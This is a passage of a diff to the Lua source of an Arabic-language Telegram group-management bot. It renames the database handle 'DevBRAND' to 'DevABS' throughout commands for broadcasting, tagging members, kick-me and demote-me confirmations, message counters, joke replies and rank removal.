-if DevBRAND:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
+if DevABS:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-local GpList = DevBRAND:smembers(BRAND.."BRAND:Groups")
+local GpList = DevABS:smembers(BRAND.."BRAND:Groups")
 for k,v in pairs(GpList) do
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end
-local PvList = DevBRAND:smembers(BRAND.."BRAND:Users")
+local PvList = DevABS:smembers(BRAND.."BRAND:Users")
 for k,v in pairs(PvList) do
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end
@@ -4174,7 +4174,7 @@ end
 end
 --     Source BRAND     --
 if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
-DevBRAND:set(BRAND..'BRAND:viewget'..msg.sender_user_id_,true)
+DevABS:set(BRAND..'BRAND:viewget'..msg.sender_user_id_,true)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
 end
 --     Source BRAND     --
@@ -4196,12 +4196,12 @@ end
 --     Source BRAND     --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
-if DevBRAND:get(BRAND.."BRAND:Kick:Me"..msg.chat_id_) then
+if DevABS:get(BRAND.."BRAND:Kick:Me"..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
 return false
 end
-DevBRAND:set(BRAND..'yes'..msg.sender_user_id_, 'delyes')
-DevBRAND:set(BRAND..'no'..msg.sender_user_id_, 'delno')
+DevABS:set(BRAND..'yes'..msg.sender_user_id_, 'delyes')
+DevABS:set(BRAND..'no'..msg.sender_user_id_, 'delno')
 local Text = '⌁︙هل انت متأكد من المغادره'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
@@ -4210,23 +4210,23 @@ return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?cha
 end
 --     Source BRAND     --
 if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
-DevBRAND:set(BRAND.."BRAND:Kick:Me"..msg.chat_id_, true)
+DevABS:set(BRAND.."BRAND:Kick:Me"..msg.chat_id_, true)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل امر اطردني'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
-DevBRAND:del(BRAND.."BRAND:Kick:Me"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Kick:Me"..msg.chat_id_)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل امر اطردني'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 --     Source BRAND     --
 if text == "نزلني" and ChCheck(msg) then
-if DevBRAND:get(BRAND.."BRAND:Del:Me"..msg.chat_id_) then
+if DevABS:get(BRAND.."BRAND:Del:Me"..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
 return false
 end
-DevBRAND:set(BRAND..'yesdel'..msg.sender_user_id_, 'delyes')
-DevBRAND:set(BRAND..'nodel'..msg.sender_user_id_, 'delno')
+DevABS:set(BRAND..'yesdel'..msg.sender_user_id_, 'delyes')
+DevABS:set(BRAND..'nodel'..msg.sender_user_id_, 'delno')
 local Text = '⌁︙هل انت متأكد من تنزيلك'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
@@ -4235,12 +4235,12 @@ return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?cha
 end
 --     Source BRAND     --
 if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
-DevBRAND:set(BRAND.."BRAND:Del:Me"..msg.chat_id_, true)
+DevABS:set(BRAND.."BRAND:Del:Me"..msg.chat_id_, true)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل امر نزلني'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
-DevBRAND:del(BRAND.."BRAND:Del:Me"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Del:Me"..msg.chat_id_)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل امر نزلني'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
@@ -4248,23 +4248,23 @@ end
 if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل امر تاك للكل'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_)
 end
 if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل امر تاك للكل'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_,true)
 end
 if Admin(msg) then
 if text == "تاك للكل" and ChCheck(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_) then
 function TagAll(dp1,dp2)
 local text = "⌁︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 i = 0
 for k, v in pairs(dp2.members_) do
 i = i + 1
-if DevBRAND:get(BRAND..'Save:UserName'..v.user_id_) then
-text = text..i.."~ : [@"..DevBRAND:get(BRAND..'Save:UserName'..v.user_id_).."]\n"
+if DevABS:get(BRAND..'Save:UserName'..v.user_id_) then
+text = text..i.."~ : [@"..DevABS:get(BRAND..'Save:UserName'..v.user_id_).."]\n"
 else
 text = text..i.."~ : "..v.user_id_.."\n"
 end
@@ -4277,14 +4277,14 @@ end
 --     Source BRAND     --
 if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
 local txt = {string.match(text, "^(كللهم) (.*)$")}
-if not DevBRAND:get(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:TagAll'..msg.chat_id_) then
 function TagAll(dp1,dp2)
 local text = "⌁︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 i = 0
 for k, v in pairs(dp2.members_) do
 i = i + 1
-if DevBRAND:get(BRAND..'Save:UserName'..v.user_id_) then
-text = text..i.."~ : [@"..DevBRAND:get(BRAND..'Save:UserName'..v.user_id_).."]\n"
+if DevABS:get(BRAND..'Save:UserName'..v.user_id_) then
+text = text..i.."~ : [@"..DevABS:get(BRAND..'Save:UserName'..v.user_id_).."]\n"
 else
 text = text..i.."~ : "..v.user_id_.."\n"
 end
@@ -4297,13 +4297,13 @@ end
 end
 --     Source BRAND     --
 if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
 end
 if text == "التفاعل" and ChCheck(msg) then
-local EntryNumber = (DevBRAND:get(BRAND..'BRAND:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
-local ExitNumber = (DevBRAND:get(BRAND..'BRAND:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
-local MsgNumberDay = (DevBRAND:get(BRAND..'BRAND:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
+local EntryNumber = (DevABS:get(BRAND..'BRAND:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
+local ExitNumber = (DevABS:get(BRAND..'BRAND:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
+local MsgNumberDay = (DevABS:get(BRAND..'BRAND:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n⌁︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n⌁︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n⌁︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
 end
 --     Source BRAND     --
@@ -4328,20 +4328,20 @@ end
 if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙@HMSEBOT', 1, 'md') end
 if text == "رابط حذف" or text == "رابط الحذف" or text == "اريد رابط الحذف" or  text == "شمرلي رابط الحذف" or text == "اريد رابط حذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على الرابط',nil,inline) return false end
 if text == "بوت الحذف" or text == "اريد بوت الحذف" or text == "اريد بوت حذف" or text == "بوت حذف" or text == "بوت حذف حسابات" or text == "راح احذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على البوت',nil,inline) return false end
-if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevBRAND:get(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
-if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevBRAND:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
+if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevABS:get(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
+if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevABS:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
 if text == "ايديي" and ChCheck(msg) then Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
 if text == "رتبتي" and ChCheck(msg) then Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
 if text == "ايدي المجموعه" and ChCheck(msg) then Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
-if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevBRAND:del(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
-if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevBRAND:del(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
+if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevABS:del(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
+if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevABS:del(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
 --     Source BRAND     --
 if text == "المطور" then 
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevBRAND:get(BRAND.."BRAND:ChId"))
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevABS:get(BRAND.."BRAND:ChId"))
 local GetInfo = JSON.decode(Check)
 local DevCh1 = GetInfo.result.username
-local DevText = DevBRAND:get(BRAND.."DevText")
-if DevBRAND:get(BRAND.."BRAND:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
+local DevText = DevABS:get(BRAND.."DevText")
+if DevABS:get(BRAND.."BRAND:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
 if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
 if DevText then
@@ -4353,7 +4353,7 @@ end,nil)
 end 
 --     Source BRAND     --
 if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
-if not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
 local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
 function BRANDTTEAM(extra,result,success)
 if result.id_ then  
@@ -4369,7 +4369,7 @@ if tonumber(result.id_) == tonumber(1566031059) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if DevBRAND:sismember(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,result.id_) then
+if DevABS:sismember(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,result.id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
@@ -4386,7 +4386,7 @@ end
 end
 --     Source BRAND     --
 if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
 function hena(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(BRAND) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
@@ -4400,7 +4400,7 @@ if tonumber(result.sender_user_id_) == tonumber(1566031059) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if DevBRAND:sismember(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,result.sender_user_id_) then
+if DevABS:sismember(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,result.sender_user_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
@@ -4416,7 +4416,7 @@ end
 end
 end
 if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
 function bosh(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(BRAND) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
@@ -4438,7 +4438,7 @@ end
 end
 end
 if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
 function seha(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(BRAND) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
@@ -4461,7 +4461,7 @@ end
 end
 --     Source BRAND     --
 if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
-if not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) then
 local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
 function BRANDTTEAM(extra,result,success)
 if result.id_ then  
@@ -4492,27 +4492,27 @@ if SudoId(result.sender_user_id_) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',result.sender_user_id_) then
 secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
-if DevBRAND:sismember(BRAND..'BRAND:SudoBot:',result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:SudoBot:',result.sender_user_id_) then
 sudobot = 'المطورين • ' else sudobot = '' end
-if DevBRAND:sismember(BRAND..'BRAND:ManagerAll:',result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:ManagerAll:',result.sender_user_id_) then
 managerall = 'المدراء العامين • ' else managerall = '' end
-if DevBRAND:sismember(BRAND..'BRAND:AdminAll:',result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:AdminAll:',result.sender_user_id_) then
 adminall = 'الادمنيه العامين • ' else adminall = '' end
-if DevBRAND:sismember(BRAND..'BRAND:VipAll:',result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:VipAll:',result.sender_user_id_) then
 vpall = 'المميزين العامين • ' else vpall = '' end
-if DevBRAND:sismember(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
 basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Constructor:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Constructor:'..msg.chat_id_, result.sender_user_id_) then
 constructor = 'المنشئين • ' else constructor = '' end 
-if DevBRAND:sismember(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_) then
 manager = 'المدراء • ' else manager = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_) then
 admins = 'الادمنيه • ' else admins = '' end
-if DevBRAND:sismember(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_) then
 vipmem = 'المميزين • ' else vipmem = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
 cleaner = 'المنظفين • ' else cleaner = ''
 end
 if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
@@ -4521,59 +4521,59 @@ else
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
 end
 if BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
-DevBRAND:srem(BRAND..'BRAND:SecondSudo:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:SudoBot:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:SecondSudo:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:SudoBot:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
-DevBRAND:srem(BRAND..'BRAND:SudoBot:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:SudoBot:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'BRANDconstructor' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
